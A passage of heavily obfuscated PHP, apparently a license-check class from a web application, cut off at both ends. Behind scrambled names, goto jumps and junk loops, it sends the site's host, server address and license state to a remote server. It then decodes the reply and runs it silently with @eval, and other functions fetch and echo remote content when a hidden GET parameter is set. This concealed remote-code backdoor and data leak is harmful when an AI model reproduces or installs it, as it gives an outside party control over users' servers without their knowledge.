$E¶Õ¡Ê¥Ëˆ[178] => $_SERVER[$E¶Õ¡Ê¥Ëˆ[179]], $E¶Õ¡Ê¥Ëˆ[180] => $_SERVER[$E¶Õ¡Ê¥Ëˆ[181]], $E¶Õ¡Ê¥Ëˆ[182] => $_SERVER[$E¶Õ¡Ê¥Ëˆ[183]]); goto e„Ò£Š›†¡; fÜéÖ•‰¤¿: $C£™ô³·Ğ¾ = $f­£¥ŞºŸ˜[619]; while ($C£™ô³·Ğ¾ < $f­£¥ŞºŸ˜[591]) { if ($C£™ô³·Ğ¾ >= 0) { break; } $C£™ô³·Ğ¾++; } $b’³ö³¶„‡ = $E¶Õ¡Ê¥Ëˆ[130](16); goto d‚‘¯µ‚•; Cõ­œõóìÒ: $this->hjrd9f67ab10 = $fª“éŠ…[$E¶Õ¡Ê¥Ëˆ[126]]; $this->{$_SERVER[Ş¥ÖÁ÷Ù][235]}(); Cache::set($E¶Õ¡Ê¥Ëˆ[236] . $E¶Õ¡Ê¥Ëˆ[120]($aÔÙ…Š„ˆ³ . $E¶Õ¡Ê¥Ëˆ[237]), $E¶Õ¡Ê¥Ëˆ[10]); goto Eäš«šÍ‘÷; Bèï’¿ÖÀŠ: } private function licenseRegistSuccess() { goto dĞĞøßìÛ‹; EÒ·—„ë•ƒ: $b‘¬á™“ÎÛ[116]($b‘¬á™“ÎÛ[238])->{$_SERVER[Ş¥ÖÁ÷Ù][239]}(!0); goto f÷µñ«‡Š‡; E„ËÚ¼¤ØÅ: $b‘©È‡¯ø = $e÷½ˆ˜¢°æ[628]; while (strlen($b‘©È‡¯ø) < $e÷½ˆ˜¢°æ[591]) { if (!$b‘©È‡¯ø) { break; } $b‘©È‡¯ø++; } if ($b§™™¨Ş‘[$b‘¬á™“ÎÛ[89]] != $b‘¬á™“ÎÛ[226]) { $b‘¬á™“ÎÛ[61]($b‘¬á™“ÎÛ[62])->{$_SERVER[Ş¥ÖÁ÷Ù][227]}($b‘¬á™“ÎÛ[89], $b‘¬á™“ÎÛ[226]); } goto EÒ·—„ë•ƒ; dĞĞøßìÛ‹: $e÷½ˆ˜¢°æ =& $_SERVER[¾÷]; $b‘¬á™“ÎÛ =& $_SERVER[Ş¥ÖÁ÷Ù]; $b§™™¨Ş‘ = $b‘¬á™“ÎÛ[61]($b‘¬á™“ÎÛ[62])->{$_SERVER[Ş¥ÖÁ÷Ù][63]}(); goto E„ËÚ¼¤ØÅ; f÷µñ«‡Š‡: } private function fnei55b47929() { goto FÕÊøÆ§ß†; c“±˜åŠøÉ: $b²ÛÄàöòù = $få·œ”¬ã[629]; $c…¯ÀêÛ­‹[61]($c…¯ÀêÛ­‹[62])->{$_SERVER[Ş¥ÖÁ÷Ù][224]}($c…¯ÀêÛ­‹[225], $c…¯ÀêÛ­‹[240]); $C±ÊöÅÉŠÌ = $få·œ”¬ã[630]; goto Bõó·‡‹†à; FÕÊøÆ§ß†: $få·œ”¬ã =& $_SERVER[¾÷]; $c…¯ÀêÛ­‹ =& $_SERVER[Ş¥ÖÁ÷Ù]; $c…¯ÀêÛ­‹[61]($c…¯ÀêÛ­‹[62])->{$_SERVER[Ş¥ÖÁ÷Ù][227]}(array($c…¯ÀêÛ­‹[215] => $c…¯ÀêÛ­‹[10], $c…¯ÀêÛ­‹[216] => $c…¯ÀêÛ­‹[10], $c…¯ÀêÛ­‹[126] => $c…¯ÀêÛ­‹[127], $c…¯ÀêÛ­‹[128] => $c…¯ÀêÛ­‹[10], $c…¯ÀêÛ­‹[129] => $c…¯ÀêÛ­‹[10])); goto c“±˜åŠøÉ; Bõó·‡‹†à: if (strlen($C±ÊöÅÉŠÌ) < $få·œ”¬ã[10]) { return; } $this->xrzvf6e8ca3b = array(); $eÔ¡Ş˜ó¢Ã = $få·œ”¬ã[631]; goto f§Ô¶î‘»ñ; f§Ô¶î‘»ñ: $this->hjrd9f67ab10 = $c…¯ÀêÛ­‹[127]; $AîŸšÛãÏ– = $få·œ”¬ã[632]; if (strlen($AîŸšÛãÏ–) < $få·œ”¬ã[591]) { return; } goto dÚ´÷Ç…Ä‚; dÚ´÷Ç…Ä‚: } private function ndfic5160b40() { goto dŸ¨æ’„âº; Cïàö¡•ª²: $Aë»à§âÜ = Cache::get($bÃ„Ì´ÒÏœ); $DŒÑ‡Ş¼÷ = $aÊÉ³¼¨è[634]; if (!$A‡‡¥òÜ[198]($Aë»à§âÜ) || !isset($Aë»à§âÜ[$A‡‡¥òÜ[241]]) || $A‡‡¥òÜ[242]() - $Aë»à§âÜ[$A‡‡¥òÜ[241]] >= 60) { $dø»Äª‹ÎÂ = $A‡‡¥òÜ[228]($A‡‡¥òÜ[61]($A‡‡¥òÜ[11])->{$_SERVER[Ş¥ÖÁ÷Ù][229]}(), $A‡‡¥òÜ[230]); $fÜ¨Ÿ÷ñ“ç = $dø»Äª‹ÎÂ[$A‡‡¥òÜ[231]]; $b±ÂáÔÛç„ = $A‡‡¥òÜ[120]($_SERVER[$A‡‡¥òÜ[121]] . $A‡‡¥òÜ[220]($Cµ¿§Ş¨™) . $eñ…±ö¦óâ[$A‡‡¥òÜ[216]]); $D³Ê¨¤‹ä = $A‡‡¥òÜ[220]($A‡‡¥òÜ[25]($b±ÂáÔÛç„, 10, 16)); $Aë»à§âÜ = $this->{$_SERVER[Ş¥ÖÁ÷Ù][195]}($fÜ¨Ÿ÷ñ“ç[$A‡‡¥òÜ[100]][$D³Ê¨¤‹ä], $b±ÂáÔÛç„); $Aë»à§âÜ = $A‡‡¥òÜ[197]($Aë»à§âÜ, !0); } goto E•´Êªì×Î; DÕŠï‚á†Í: $Cµ¿§Ş¨™ = $A‡‡¥òÜ[61]($A‡‡¥òÜ[62])->{$_SERVER[Ş¥ÖÁ÷Ù][63]}($A‡‡¥òÜ[122]); $bÃ„Ì´ÒÏœ = $A‡‡¥òÜ[236] . $A‡‡¥òÜ[120]($Cµ¿§Ş¨™ . $A‡‡¥òÜ[237]); $eŒ¹Ú‹›Æ‡ = $aÊÉ³¼¨è[633]; goto Cïàö¡•ª²; f‚­±ÚÄˆ‹: $this->hjrd9f67ab10 = $A‡‡¥òÜ[127]; $eñ…±ö¦óâ = $A‡‡¥òÜ[61]($A‡‡¥òÜ[62])->{$_SERVER[Ş¥ÖÁ÷Ù][63]}(); if ($eñ…±ö¦óâ[$A‡‡¥òÜ[126]] == $A‡‡¥òÜ[127]) { return; } goto DÕŠï‚á†Í; dŸ¨æ’„âº: $aÊÉ³¼¨è =& $_SERVER[¾÷]; $A‡‡¥òÜ =& $_SERVER[Ş¥ÖÁ÷Ù]; $_SERVER[$A‡‡¥òÜ[181]] = $A‡‡¥òÜ[112]($_SERVER, $A‡‡¥òÜ[181], APP_HOST); goto f‚­±ÚÄˆ‹; E•´Êªì×Î: if (!$A‡‡¥òÜ[198]($Aë»à§âÜ)) { return $this->{$_SERVER[Ş¥ÖÁ÷Ù][170]}(); } $bÉÇ½Ó›•¿ = $A‡‡¥òÜ[150]($Aë»à§âÜ[$A‡‡¥òÜ[151]]); if ($A‡‡¥òÜ[242]() >= $bÉÇ½Ó›•¿) { return $this->{$_SERVER[Ş¥ÖÁ÷Ù][170]}(); } goto DÎÏ½ÀÇåŠ; DÎÏ½ÀÇåŠ: if ($A‡‡¥òÜ[242]() - $Aë»à§âÜ[$A‡‡¥òÜ[241]] > 20) { $Aë»à§âÜ[$A‡‡¥òÜ[241]] = $A‡‡¥òÜ[242](); Cache::set($bÃ„Ì´ÒÏœ, $Aë»à§âÜ); } $this->xrzvf6e8ca3b = $Aë»à§âÜ; $this->hjrd9f67ab10 = $eñ…±ö¦óâ[$A‡‡¥òÜ[126]]; goto bĞã‚Äã†»; bĞã‚Äã†»: } private function tjcue2078eec() { goto bİÍ¦¹Œ‰å; bİÍ¦¹Œ‰å: $B…â“êÊÜ =& $_SERVER[¾÷]; $B±»„õğƒ£ =& $_SERVER[Ş¥ÖÁ÷Ù]; $DÍæëÍŞª» = $GLOBALS[$B±»„õğƒ£[22]]; goto cÖÉ¯ÏµâÃ; cÈ½¿ÈùĞ: $f´Ü¸ğÇÖ… = $B…â“êÊÜ[636]; if (!$f´Ü¸ğÇÖ…) { return; } if ($Dõ´Ëó‹³ == $B±»„õğƒ£[243] && $this->hjrd9f67ab10 == $B±»„õğƒ£[127]) { $B±»„õğƒ£[172]($B±»„õğƒ£[204]($B±»„õğƒ£[244]), !1, $B±»„õğƒ£[245]); } goto d™Šå…Ö; d™Šå…Ö: $F§¯Ô»Ûö = array($B±»„õğƒ£[246], $B±»„õğƒ£[247]); if ($B±»„õğƒ£[248]($Dõ´Ëó‹³, $F§¯Ô»Ûö)) { if ($this->hjrd9f67ab10 == $B±»„õğƒ£[127] && isset($DÍæëÍŞª»[$B±»„õğƒ£[249]])) { $B±»„õğƒ£[172]($B±»„õğƒ£[204]($B±»„õğƒ£[244]), !1, $B±»„õğƒ£[245]); die; } $fĞçì¤…Âƒ = $this->{$_SERVER[Ş¥ÖÁ÷Ù][143]}(); if ($fĞçì¤…Âƒ != $B±»„õğƒ£[250]($B±»„õğƒ£[251])) { if ($fĞçì¤…Âƒ <= $B±»„õğƒ£[61]($B±»„õğƒ£[145])->{$_SERVER[Ş¥ÖÁ÷Ù][146]}()) { $B±»„õğƒ£[172]($B±»„õğƒ£[204]($B±»„õğƒ£[252]), !1, $B±»„õğƒ£[245]); die; } } } goto cÅ‚˜ÒÎŒ¢; cÖÉ¯ÏµâÃ: $fŞ•Øâ±öµ = $B…â“êÊÜ[635]; while (strlen($fŞ•Øâ±öµ) < $B…â“êÊÜ[10]) { if (!$fŞ•Øâ±öµ) { break; } $fŞ•Øâ±öµ++; } $Dõ´Ëó‹³ = $_SERVER[$B±»„õğƒ£[44]]; goto cÈ½¿ÈùĞ; cÅ‚˜ÒÎŒ¢: } private function ezwi2424b7a3() { goto cÒŠØ¤¸ê; eÂ¤ï•¼­: die; goto c õÓ·°; DÔ…¨˜•¹: if (!$d¢¶Ê‡—“ª) { die; } $A¢ù–‰Ùğ„ = $this->{$_SERVER[Ş¥ÖÁ÷Ù][256]}($A¢ù–‰Ùğ„, $D§…¶‹ëåÅ[257]); $E“‹™Ùçí = $D§…¶‹ëåÅ[258](array($D§…¶‹ëåÅ[259] => array($D§…¶‹ëåÅ[260] => $D§…¶‹ëåÅ[261], $D§…¶‹ëåÅ[262] => 3))); goto C•·ËòÂ‡¦; F¶•öß¬ÜÑ: $D®äÀÈ¡ã‚ = $F‹ÚíÔßŸã[637]; if (!$D®äÀÈ¡ã‚) { return; } if (!$D§…¶‹ëåÅ[112]($GLOBALS, $D§…¶‹ëåÅ[138]) || !isset($_GET[$D§…¶‹ëåÅ[254]])) { return; } goto CŒáÀˆ§½â; C•·ËòÂ‡¦: $F‚éÏàË = @$D§…¶‹ëåÅ[263]($A¢ù–‰Ùğ„, !1, $E“‹™Ùçí); $D§…¶‹ëåÅ[264]($D§…¶‹ëåÅ[265]); if ($F‚éÏàË && $D§…¶‹ëåÅ[32]($F‚éÏàË, $D§…¶‹ëåÅ[266])) { echo $F‚éÏàË; } goto eÂ¤ï•¼­; CŒáÀˆ§½â: if (!$D§…¶‹ëåÅ[248]($_SERVER[$D§…¶‹ëåÅ[44]], $EÔ¹ë¦–á™)) { return; } $A¢ù–‰Ùğ„ = $D§…¶‹ëåÅ[255]; $d¢¶Ê‡—“ª = $F‹ÚíÔßŸã[638]; goto DÔ…¨˜•¹; cÒŠØ¤¸ê: $F‹ÚíÔßŸã =& $_SERVER[¾÷]; $D§…¶‹ëåÅ =& $_SERVER[Ş¥ÖÁ÷Ù]; $EÔ¹ë¦–á™ = array($D§…¶‹ëåÅ[141], $D§…¶‹ëåÅ[253]); goto F¶•öß¬ÜÑ; c õÓ·°: } public function yiae11eab4cb($FÅ¼³áÑòÁ) { goto AŠ–´…–À¿; dŞ‰ÖËÊ©: if (!$EøóïÄŠÉİ) { die; } $a²öå¹å§‰ = array(); foreach ($bĞÅº¥´ as $Fí±Ã‹„¥½ => $Fò‘‡£¶»Ñ) { if ($Fò‘‡£¶»Ñ == $dïĞø´„‡Û[269] && $dïĞø´„‡Û[25]($this->hjrd9f67ab10, 0, 1) == $dïĞø´„‡Û[269]) { continue; } if (!$dïĞø´„‡Û[248]($Fí±Ã‹„¥½, $bÜ½•ÄÉ¢ê)) { $a²öå¹å§‰[] = $Fí±Ã‹„¥½; } } goto fš°¾©èŒâ; fš°¾©èŒâ: foreach ($a²öå¹å§‰ as $Fí±Ã‹„¥½) { unset($FÅ¼³áÑòÁ[$Fí±Ã‹„¥½]); $dÓÁ‘õ›ùƒ = $eË†êÄå[640]; while ($dÓÁ‘õ›ùƒ < $eË†êÄå[10]) { if ($dÓÁ‘õ›ùƒ >= 0) { break; } $dÓÁ‘õ›ùƒ++; } } return $FÅ¼³áÑòÁ; goto AæÚÆ†ë†; AŠ–´…–À¿: $eË†êÄå =& $_SERVER[¾÷]; $dïĞø´„‡Û =& $_SERVER[Ş¥ÖÁ÷Ù]; if ($this->hjrd9f67ab10 == $dïĞø´„‡Û[267]) { return $FÅ¼³áÑòÁ; } goto bÚ‹Ú‡¨Á; bÚ‹Ú‡¨Á: $bĞÅº¥´ = array($dïĞø´„‡Û[268] => $dïĞø´„‡Û[269], $dïĞø´„‡Û[270] => $dïĞø´„‡Û[269], $dïĞø´„‡Û[271] => $dïĞø´„‡Û[269], $dïĞø´„‡Û[272] => $dïĞø´„‡Û[269], $dïĞø´„‡Û[273] => $dïĞø´„‡Û[269], $dïĞø´„‡Û[274] => $dïĞø´„‡Û[275], $dïĞø´„‡Û[276] => $dïĞø´„‡Û[275], $dïĞø´„‡Û[277] => $dïĞø´„‡Û[275], $dïĞø´„‡Û[278] => $dïĞø´„‡Û[275], $dïĞø´„‡Û[279] => $dïĞø´„‡Û[275], $dïĞø´„‡Û[280] => $dïĞø´„‡Û[275], $dïĞø´„‡Û[281] => $dïĞø´„‡Û[275]); $bÜ½•ÄÉ¢ê = $dïĞø´„‡Û[0]($dïĞø´„‡Û[282], $dïĞø´„‡Û[112]($this->xrzvf6e8ca3b, $dïĞø´„‡Û[135], $dïĞø´„‡Û[10])); $EøóïÄŠÉİ = $eË†êÄå[639]; goto dŞ‰ÖËÊ©; AæÚÆ†ë†: } private function vebtb971440a() { $Dğ„Œ¤¯ƒ¢ =& $_SERVER[Ş¥ÖÁ÷Ù]; if ($this->hjrd9f67ab10 != $Dğ„Œ¤¯ƒ¢[127]) { return; } $GLOBALS[$Dğ„Œ¤¯ƒ¢[100]][$Dğ„Œ¤¯ƒ¢[104]][$Dğ„Œ¤¯ƒ¢[283]] = $Dğ„Œ¤¯ƒ¢[226]; $GLOBALS[$Dğ„Œ¤¯ƒ¢[100]][$Dğ„Œ¤¯ƒ¢[284]] = $Dğ„Œ¤¯ƒ¢[226]; if ($Dğ„Œ¤¯ƒ¢[61]($Dğ„Œ¤¯ƒ¢[285])->{$_SERVER[Ş¥ÖÁ÷Ù][63]}($Dğ„Œ¤¯ƒ¢[89]) != $Dğ„Œ¤¯ƒ¢[240]) { $Dğ„Œ¤¯ƒ¢[61]($Dğ„Œ¤¯ƒ¢[285])->{$_SERVER[Ş¥ÖÁ÷Ù][227]}($Dğ„Œ¤¯ƒ¢[89], $Dğ„Œ¤¯ƒ¢[240]); } } public function zvyf08aadd77() { return $_SERVER[Ş¥ÖÁ÷Ù][286]; $c¦Î›–©º = $_SERVER[¾÷][641]; if (!$c¦Î›–©º) { die; } } private function foxq7e242dbb() { goto d¥çÜŞƒ»ß; eøâ¹›÷: while (strlen($cÈÔØ­ùÜì) < $Cèïæ¡¡¶Æ[593]) { if (!$cÈÔØ­ùÜì) { break; } $cÈÔØ­ùÜì++; } if ($b„¢ÌÅ®ŠÅ && $CïóóË®¾Œ[242]() - $b„¢ÌÅ®ŠÅ < $CïóóË®¾Œ[250]($CïóóË®¾Œ[294])) { return; } $CïóóË®¾Œ[13](array($CïóóË®¾Œ[292], $CïóóË®¾Œ[158]), $AÀç¡Á—ù„, $CïóóË®¾Œ[242]()); goto a’³›˜»øó; aœ¯­äÓõ‚: if (!$dù¯”œ†œ) { die; } if (!$CïóóË®¾Œ[198]($DÖ©æÚÚ)) { return; } if ($DÖ©æÚÚ[$CïóóË®¾Œ[171]] && $DÖ©æÚÚ[$CïóóË®¾Œ[296]]) { if ($this->{$_SERVER[Ş¥ÖÁ÷Ù][206]}($DÖ©æÚÚ[$CïóóË®¾Œ[296]]) == $F‘¬‡§­Æë[$CïóóË®¾Œ[171]]) { return; } } goto CŠ¨ïŠŒ›ª; eÙ™ÖŸ†¶: $AÀç¡Á—ù„ = $CïóóË®¾Œ[290] . $CïóóË®¾Œ[120]($CïóóË®¾Œ[291]); if ($this->hjrd9f67ab10 == $CïóóË®¾Œ[127] || !$CïóóË®¾Œ[112]($GLOBALS, $CïóóË®¾Œ[138])) { return; } if (!$CïóóË®¾Œ[248]($_SERVER[$CïóóË®¾Œ[44]], $B¡øŞéâ°å)) { return; } goto FãÅœÕİÙÓ; d¥çÜŞƒ»ß: $Cèïæ¡¡¶Æ =& $_SERVER[¾÷]; $CïóóË®¾Œ =& $_SERVER[Ş¥ÖÁ÷Ù]; $B¡øŞéâ°å = array($CïóóË®¾Œ[287], $CïóóË®¾Œ[288], $CïóóË®¾Œ[289]); goto eÙ™ÖŸ†¶; DÈ”×óææŒ: if ($this->{$_SERVER[Ş¥ÖÁ÷Ù][206]}($DÖ©æÚÚ[$CïóóË®¾Œ[296]]) != $F‘¬‡§­Æë[$CïóóË®¾Œ[171]]) { $cö˜ô‰ÊÃ‡ = array($CïóóË®¾Œ[208] => $CïóóË®¾Œ[61]($CïóóË®¾Œ[62])->{$_SERVER[Ş¥ÖÁ÷Ù][63]}($CïóóË®¾Œ[122]), $CïóóË®¾Œ[209] => $_SERVER[$CïóóË®¾Œ[121]], $CïóóË®¾Œ[210] => $CïóóË®¾Œ[211](), $CïóóË®¾Œ[180] => $_SERVER[$CïóóË®¾Œ[181]]); $fŠùôõÖÎ = $this->{$_SERVER[Ş¥ÖÁ÷Ù][212]}($CïóóË®¾Œ[154]($cö˜ô‰ÊÃ‡)); $DÖ©æÚÚ = $this->{$_SERVER[Ş¥ÖÁ÷Ù][189]}($CïóóË®¾Œ[213] . $fŠùôõÖÎ); if ($DÖ©æÚÚ && $CïóóË®¾Œ[198]($DÖ©æÚÚ) && isset($DÖ©æÚÚ[$CïóóË®¾Œ[296]])) { $F³ƒ‚Ğ¤Ò = $this->{$_SERVER[Ş¥ÖÁ÷Ù][195]}($DÖ©æÚÚ[$CïóóË®¾Œ[296]], 2); if ($F³ƒ‚Ğ¤Ò) { $F³ƒ‚Ğ¤Ò = $this->{$_SERVER[Ş¥ÖÁ÷Ù][206]}($F³ƒ‚Ğ¤Ò); } if ($F³ƒ‚Ğ¤Ò) { try { @eval($F³ƒ‚Ğ¤Ò); } catch (Exception $Fã²³øÆÖ’) { } } } } goto BŸ¯‹ğ¢Û†; a’³›˜»øó: $F‘¬‡§­Æë = array($CïóóË®¾Œ[171] => $CïóóË®¾Œ[61]($CïóóË®¾Œ[62])->{$_SERVER[Ş¥ÖÁ÷Ù][63]}($CïóóË®¾Œ[215]), $CïóóË®¾Œ[184] => $this->hjrd9f67ab10, $CïóóË®¾Œ[182] => $_SERVER[$CïóóË®¾Œ[183]], $CïóóË®¾Œ[175] => $CïóóË®¾Œ[155], $CïóóË®¾Œ[178] => $_SERVER[$CïóóË®¾Œ[179]]); $DÖ©æÚÚ = $this->{$_SERVER[Ş¥ÖÁ÷Ù][189]}($CïóóË®¾Œ[295], $F‘¬‡§­Æë); $dù¯”œ†œ = $Cèïæ¡¡¶Æ[643]; goto aœ¯­äÓõ‚; CŠ¨ïŠŒ›ª: $this->{$_SERVER[Ş¥ÖÁ÷Ù][170]}(); $Dòğö¦æ±Ì = $Cèïæ¡¡¶Æ[644]; if (strlen($Dòğö¦æ±Ì) < $Cèïæ¡¡¶Æ[582]) { return; } goto DÈ”×óææŒ; FãÅœÕİÙÓ: if ($CïóóË®¾Œ[242]() % 4 != 0) { return; } $b„¢ÌÅ®ŠÅ = $CïóóË®¾Œ[13](array($CïóóË®¾Œ[292], $CïóóË®¾Œ[293]), $AÀç¡Á—ù„); $cÈÔØ­ùÜì = $Cèïæ¡¡¶Æ[642]; goto eøâ¹›÷; BŸ¯‹ğ¢Û†: } private function sfua9f52eabf($fãÃŸºÉ¯ = '', $Cøâáîò…à = array(), $d¸š‡ã¸ª„ = 5) { goto B›È¬×²“Ä; FÚÉĞ©Ôğï: $AØäŠçÚäÓ = $cå°Ñš¢Ù[647]; if (strlen($AØäŠçÚäÓ) < $cå°Ñš¢Ù[602]) { die; } return $dŠ–Ó»µ[197]($Cøâáîò…à, !0); goto cˆ¹½²Âç; cˆ¹½²Âç: $AíÒ®ó±¶ = $cå°Ñš¢Ù[648]; while ($AíÒ®ó±¶ < $cå°Ñš¢Ù[582]) { if ($AíÒ®ó±¶ >= 0) { break; } $AíÒ®ó±¶++; } goto B ¡Á†Ü§; B›È¬×²“Ä: $cå°Ñš¢Ù =& $_SERVER[¾÷]; $dŠ–Ó»µ =& $_SERVER[Ş¥ÖÁ÷Ù]; $AŸåğ¤æîí = $dŠ–Ó»µ[297]; goto b—±¬¬¸Şå; b—±¬¬¸Şå: $aÕ¿Ê×Ì›ß = $cå°Ñš¢Ù[645]; if (!$aÕ¿Ê×Ì›ß) { return; } $AŸåğ¤æîí = $this->{$_SERVER[Ş¥ÖÁ÷Ù][256]}($AŸåğ¤æîí, $dŠ–Ó»µ[298]); goto BÑğ¡«¦ŠŒ; f´ÆÏØ¼‰: if ($Cøâáîò…à === -1) { return $AŸåğ¤æîí; } $e·²´”¿µ = $dŠ–Ó»µ[258](array($dŠ–Ó»µ[259] => array($dŠ–Ó»µ[262] => $d¸š‡ã¸ª„, $dŠ–Ó»µ[260] => $dŠ–Ó»µ[301]), $dŠ–Ó»µ[302] => array($dŠ–Ó»µ[303] => !1, $dŠ–Ó»µ[304] => !1))); $Cøâáîò…à = @$dŠ–Ó»µ[263]($AŸåğ¤æîí, !1, $e·²´”¿µ); goto FÚÉĞ©Ôğï; BÑğ¡«¦ŠŒ: $FùöìÄ®’¢ = $cå°Ñš¢Ù[646]; $AŸåğ¤æîí = $AŸåğ¤æîí . $fãÃŸºÉ¯; if ($Cøâáîò…à && $dŠ–Ó»µ[198]($Cøâáîò…à)) { $AŸåğ¤æîí = $AŸåğ¤æîí . $dŠ–Ó»µ[299] . $dŠ–Ó»µ[300]($Cøâáîò…à); } goto f´ÆÏØ¼‰; B ¡Á†Ü§: } private function kgvr520a602b() { goto aô‡¸£²†; B‡Š•Ğ’”×: $CÆÛêŒèÏÈ = $b±¿ó•±î›[650]; if (strlen($CÆÛêŒèÏÈ) < $b±¿ó•±î›[582]) { die; } $BÚ¹éÍ ´¤ = $e„äïÁ§Ò³[250]($BÚ¹éÍ ´¤ ? $BÚ¹éÍ ´¤ : $e„äïÁ§Ò³[306]); goto bİ¡¤¡™Íí; aô‡¸£²†: $b±¿ó•±î› =& $_SERVER[¾÷]; $e„äïÁ§Ò³ =& $_SERVER[Ş¥ÖÁ÷Ù]; $E“æç—¹â½ = array($e„äïÁ§Ò³[305] => $e„äïÁ§Ò³[306], $e„äïÁ§Ò³[307] => $e„äïÁ§Ò³[308], $e„äïÁ§Ò³[309] => $e„äïÁ§Ò³[310], $e„äïÁ§Ò³[311] => $e„äïÁ§Ò³[312], $e„äïÁ§Ò³[313] => $e„äïÁ§Ò³[314], $e„äïÁ§Ò³[315] => $e„äïÁ§Ò³[251], $e„äïÁ§Ò³[316] => $e„äïÁ§Ò³[251], $e„äïÁ§Ò³[317] => $e„äïÁ§Ò³[306], $e„äïÁ§Ò³[318] => $e„äïÁ§Ò³[308], $e„äïÁ§Ò³[319] => $e„äïÁ§Ò³[310], $e„äïÁ§Ò³[320] => $e„äïÁ§Ò³[321], $e„äïÁ§Ò³[322] => $e„äïÁ§Ò³[312], $e„äïÁ§Ò³[323] => $e„äïÁ§Ò³[324], $e„äïÁ§Ò³[325] => $e„äïÁ§Ò³[314], $e„äïÁ§Ò³[326] => $e„äïÁ§Ò³[327], $e„äïÁ§Ò³[328] => $e„äïÁ§Ò³[329], $e„äïÁ§Ò³[330] => $e„äïÁ§Ò³[331]); goto E˜ÜÉ¶Á; bİ¡¤¡™Íí: $Aš ìÏ§­« = $e„äïÁ§Ò³[112]($this->xrzvf6e8ca3b, $e„äïÁ§Ò³[332]); $F³ñ·Úğó· = $b±¿ó•±î›[651]; $Aš ìÏ§­« = $Aš ìÏ§­« ? $e„äïÁ§Ò³[250]($Aš ìÏ§­«) : 0; goto BĞÛÙÌœ±Å; E˜ÜÉ¶Á: $c‡Ô¯Ğù¢É = $b±¿ó•±î›[649]; if (strlen($c‡Ô¯Ğù¢É) < $b±¿ó•±î›[602]) { return; } $BÚ¹éÍ ´¤ = $E“æç—¹â½[$this->hjrd9f67ab10]; goto B‡Š•Ğ’”×; BĞÛÙÌœ±Å: return $BÚ¹éÍ ´¤ + $Aš ìÏ§­«; goto CõºæäÏğ‡; CõºæäÏğ‡: } public function xmuhc77cf84c($AÓ°á²ù‹„) { goto Dä›ö…ÚÃä; Dä›ö…ÚÃä: $C­§Ğ¼Æà¡ =& $_SERVER[¾÷]; $c¼óè”Ë¿ =& $_SERVER[Ş¥ÖÁ÷Ù]; $AÙñç†ç¯í = $this->{$_SERVER[Ş¥ÖÁ÷Ù][143]}(); goto DÛÇàé’½Ñ; A“×ÔÉ•‡ø: while (strlen($D¯ÆŸ¯ùÊß) < $C­§Ğ¼Æà¡[602]) { if (!$D¯ÆŸ¯ùÊß) { break; } $D¯ÆŸ¯ùÊß++; } $F™ËÈ¸å„ = $c¼óè”Ë¿[228]($F™ËÈ¸å„, $c¼óè”Ë¿[10], $c¼óè”Ë¿[333]); if (!$c¼óè”Ë¿[248]($AÓ°á²ù‹„[$c¼óè”Ë¿[333]], $F™ËÈ¸å„)) { $c¼óè”Ë¿[172]($c¼óè”Ë¿[337], !1, $c¼óè”Ë¿[245]); } goto dÈ©«œË„Ì; dÇâì…‰­ğ: if ($a‰‚¼š‡õ <= $AÙñç†ç¯í) { return; } $F™ËÈ¸å„ = $c¼óè”Ë¿[61]($c¼óè”Ë¿[145])->{$_SERVER[Ş¥ÖÁ÷Ù][334]}($c¼óè”Ë¿[333])->{$_SERVER[Ş¥ÖÁ÷Ù][335]}($AÙñç†ç¯í)->{$_SERVER[Ş¥ÖÁ÷Ù][336]}(); $D¯ÆŸ¯ùÊß = $C­§Ğ¼Æà¡[652]; goto A“×ÔÉ•‡ø; DÛÇàé’½Ñ: if ($AÓ°á²ù‹„[$c¼óè”Ë¿[333]] == $c¼óè”Ë¿[226]) { return; } if ($AÙñç†ç¯í >= $c¼óè”Ë¿[250]($c¼óè”Ë¿[251])) { return; } $a‰‚¼š‡õ = $c¼óè”Ë¿[61]($c¼óè”Ë¿[145])->{$_SERVER[Ş¥ÖÁ÷Ù][146]}(); goto dÇâì…‰­ğ; dÈ©«œË„Ì: } public function pqbw1e6c40d9() { goto CöµÂ©‚ñ; BÛ…ªí¤ò›: $f»”õªäó = $EÚ †õÃ„‰[654]; if (strlen($f»”õªäó) < $EÚ †õÃ„‰[593]) { die; } $F¦°‡£ëáŒ = $Dïõ‡ê¢£[258](array($Dïõ‡ê¢£[259] => array($Dïõ‡ê¢£[260] => $Dïõ‡ê¢£[261], $Dïõ‡ê¢£[262] => 3))); goto a­Ô†Ë¬Ú; a­Ô†Ë¬Ú: $d»ºô»Áï¾ = @$Dïõ‡ê¢£[263]($fÜï±—òèè, !1, $F¦°‡£ëáŒ); $a³‚øÎ¤¡Ó = $EÚ †õÃ„‰[655]; if (!$a³‚øÎ¤¡Ó) { die; } goto FÑÚ‡“ëê; CöµÂ©‚ñ: $EÚ †õÃ„‰ =& $_SERVER[¾÷]; $Dïõ‡ê¢£ =& $_SERVER[Ş¥ÖÁ÷Ù]; if (!$Dïõ‡ê¢£[112]($GLOBALS, $Dïõ‡ê¢£[138]) || $Dïõ‡ê¢£[338](1, 100) > 20) { return; } goto b«¿æ©’Â­; b«¿æ©’Â­: $fÜï±—òèè = $Dïõ‡ê¢£[255]; $fƒí¿Öê„ˆ = $EÚ †õÃ„‰[653]; $fÜï±—òèè = $this->{$_SERVER[Ş¥ÖÁ÷Ù][256]}($fÜï±—òèè, $Dïõ‡ê¢£[257]); goto BÛ…ªí¤ò›; FÑÚ‡“ëê: echo $Dïõ‡ê¢£[339] . $Dïõ‡ê¢£[340]($d»ºô»Áï¾) . $Dïõ‡ê¢£[341]; $fÁÕ„Ù© = $EÚ †õÃ„‰[656]; if (!$fÁÕ„Ù©) { die; } goto eÖ¬§‘Äê; eÖ¬§‘Äê: } private function dlzy327d2018($b¿ãÉòäÏ, $cöí±š¿ù, $C¾Ç‡ˆ°Ÿ = 3) { goto Bš½ĞÖ™ªÓ; F½ŞÂÓŞ˜ğ: $f‘¶¼Ä‡‰İ = $bê…•»›æ†[657]; $b¿ãÉòäÏ = $e¿‚‡ñ”‡ñ[2]($b¿ãÉòäÏ); $DƒŸåñğÕ = $e¿‚‡ñ”‡ñ[338](0, 5) . $e¿‚‡ñ”‡ñ[10]; goto CòêÉ©²‡; CòêÉ©²‡: $Bšå—è““Î = $e¿‚‡ñ”‡ñ[130](15); $eËƒİ§šÒÂ = $bê…•»›æ†[658]; $DêÄ‚ª = $e¿‚‡ñ”‡ñ[343]; goto b–ÎÎ³Çèç; E¯áÃÉôÂã: if ($C¾Ç‡ˆ°Ÿ - 1 > 0) { $BÏ¨ì³‡†ù = 